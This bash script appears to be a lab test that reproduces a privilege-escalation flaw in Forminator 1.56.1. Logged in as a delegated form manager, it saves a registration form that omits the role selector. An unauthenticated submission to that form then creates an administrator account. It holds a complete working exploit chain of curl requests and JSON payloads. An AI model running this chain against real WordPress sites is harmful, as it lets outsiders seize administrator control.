#!/usr/bin/env bash
set -euo pipefail
# shellcheck source=tests/common.sh
source "$(dirname -- "$0")/common.sh"

assert_forminator_version 1.56.1
MARKER="RS_ROLE_DOCKER_$(date +%s)_$$"
USERNAME=$(printf 'pwned%s' "$(date +%s)$$" | cut -c1-24)
FORM_ID=''
JAR=$(mktemp "${TMPDIR:-/tmp}/forminator-role.XXXXXX")

cleanup() {
  wp user delete "$USERNAME" --yes >/dev/null 2>&1 || true
  wp user delete formmgr --yes >/dev/null 2>&1 || true
  wp role delete formmgr >/dev/null 2>&1 || true
  wp option delete forminator_permissions >/dev/null 2>&1 || true
  wp option update users_can_register 0 >/dev/null 2>&1 || true
  if [[ -n "$FORM_ID" ]]; then
    db_query "DELETE m FROM wp_frmt_form_entry_meta m JOIN wp_frmt_form_entry e ON e.entry_id=m.entry_id WHERE e.form_id=${FORM_ID}; DELETE FROM wp_frmt_form_entry WHERE form_id=${FORM_ID};" >/dev/null || true
  fi
  cleanup_posts "$FORM_ID"
  rm -f -- "$JAR"
}
trap cleanup EXIT

wp user delete formmgr --yes >/dev/null 2>&1 || true
wp role delete formmgr >/dev/null 2>&1 || true
wp role create formmgr 'Form Manager' >/dev/null
wp cap add formmgr manage_forminator_modules create_users read >/dev/null
wp user create formmgr formmgr@example.test --role=formmgr --user_pass='FrmMgr-Lab-Only-1!' >/dev/null
wp option update forminator_permissions '[{"permission_type":"role","user_role":"formmgr","exclude_users":[]}]' --format=json >/dev/null
wp option update users_can_register 1 >/dev/null
FORM_ID=$(wp post create --post_type=forminator_forms --post_title="$MARKER" --post_status=draft --porcelain)

curl -fsS -c "$JAR" "$BASE_URL/wp-login.php" >/dev/null
curl -fsS -b "$JAR" -c "$JAR" -X POST "$BASE_URL/wp-login.php" \
  --data-urlencode 'log=formmgr' \
  --data-urlencode 'pwd=FrmMgr-Lab-Only-1!' \
  --data-urlencode 'wp-submit=Log In' \
  --data-urlencode "redirect_to=$BASE_URL/wp-admin/" >/dev/null

NONCE_JSON=$(curl -fsS -b "$JAR" \
  "$BASE_URL/?__labnonce=1&labkey=forminator-lab-only&actions=forminator_save_builder_fields")
NONCE=$(printf '%s' "$NONCE_JSON" | python3 -c 'import json,sys; print(json.load(sys.stdin)["forminator_save_builder_fields"])')

DATA_CONTROL='{"wrappers":[{"wrapper_id":"wrap-1","fields":[{"type":"text","element_id":"text-1","cols":12,"field_label":"Username"},{"type":"email","element_id":"email-1","cols":12,"field_label":"Email"}]}],"settings":{"form-type":"registration","formName":"role-control","registration-username-field":"text-1","registration-email-field":"email-1","registration-password-field":"auto","activation-method":"default","registration-user-role":"fixed","registration-role-field":"administrator"}}'
CONTROL=$(curl -fsS -b "$JAR" "$BASE_URL/wp-admin/admin-ajax.php" \
  --data-urlencode 'action=forminator_save_builder' \
  --data-urlencode "form_id=$FORM_ID" \
  --data-urlencode 'formName=role-control' \
  --data-urlencode 'status=publish' \
  --data-urlencode 'version=1.0' \
  --data-urlencode "_ajax_nonce=$NONCE" \
  --data-urlencode "data=$DATA_CONTROL")
[[ "$CONTROL" == *invalid_user_role* ]] || {
  printf '[role] FAIL: negative control was not rejected: %s\n' "${CONTROL:0:300}" >&2
  exit 1
}

DATA_ATTACK='{"wrappers":[{"wrapper_id":"wrap-1","fields":[{"type":"text","element_id":"text-1","cols":12,"field_label":"Username"},{"type":"email","element_id":"email-1","cols":12,"field_label":"Email"}]}],"settings":{"form-type":"registration","formName":"role-attack","registration-username-field":"text-1","registration-email-field":"email-1","registration-password-field":"auto","activation-method":"default","registration-role-field":"administrator"}}'
ATTACK=$(curl -fsS -b "$JAR" "$BASE_URL/wp-admin/admin-ajax.php" \
  --data-urlencode 'action=forminator_save_builder' \
  --data-urlencode "form_id=$FORM_ID" \
  --data-urlencode 'formName=role-attack' \
  --data-urlencode 'status=publish' \
  --data-urlencode 'version=1.0' \
  --data-urlencode "_ajax_nonce=$NONCE" \
  --data-urlencode "data=$DATA_ATTACK")
[[ "$ATTACK" == *'"success":true'* ]] || {
  printf '[role] FAIL: key-omission save rejected: %s\n' "${ATTACK:0:300}" >&2
  exit 1
}

SUBMIT_NONCE=$(curl -fsS -X POST "$BASE_URL/wp-admin/admin-ajax.php" \
  --data "action=forminator_get_nonce&form_id=$FORM_ID" \
  | python3 -c 'import json,sys; print(json.load(sys.stdin)["data"])')
SUBMIT=$(curl -fsS "$BASE_URL/wp-admin/admin-ajax.php" \
  --data 'action=forminator_submit_form_custom-forms' \
  --data "form_id=$FORM_ID" \
  --data-urlencode "text-1=$USERNAME" \
  --data-urlencode "email-1=$USERNAME@example.test" \
  --data "forminator_nonce=$SUBMIT_NONCE")

ROLE=$(wp user get "$USERNAME" --field=roles 2>/dev/null || true)
[[ "$ROLE" == *administrator* ]] || {
  printf '[role] FAIL: expected administrator user; role=%s response=%s\n' "$ROLE" "${SUBMIT:0:300}" >&2
  exit 1
}

printf 'RS_OK %s — delegated manager save control rejected, omitted-selector save accepted, unauthenticated submission created %s as administrator\n' "$MARKER" "$USERNAME"
